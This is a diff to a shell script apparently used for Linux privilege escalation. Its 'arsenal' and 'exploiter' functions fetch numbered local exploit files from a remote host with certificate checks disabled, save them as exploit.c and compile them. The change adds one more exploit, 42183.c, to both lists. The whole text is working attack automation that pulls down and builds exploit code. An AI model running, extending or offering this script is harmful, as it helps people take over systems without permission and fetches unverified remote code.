@@ -102,7 +102,8 @@ function arsenal(){
 	sudo wget --no-check-certificate $gaddress/linux/local/40839.c 
 	sudo wget --no-check-certificate $gaddress/linux/local/35370.c 
 	sudo wget --no-check-certificate $gaddress/linux/local/38390.c 
-	sudo wget --no-check-certificate $gaddress/linux/local/39230.c 
+	sudo wget --no-check-certificate $gaddress/linux/local/39230.c
+	sudo wget --no-check-certificate $gaddress/linux/local/42183.c
 
 	#bash exploits
 	sudo wget --no-check-certificate $gaddress/linux/local/2011.sh 
@@ -421,7 +422,8 @@ function exploiter(){
 	ccmpl;
 	wget --no-check-certificate $gaddress/linux/local/39230.c -O exploit.c
 	ccmpl;
-
+	wget --no-check-certificate $gaddress/linux/local/42183.c -O exploit.c
+	ccmpl;
 
 	#sh
 	wget --no-check-certificate $gaddress/linux/local/2011.sh -O exploit.sh
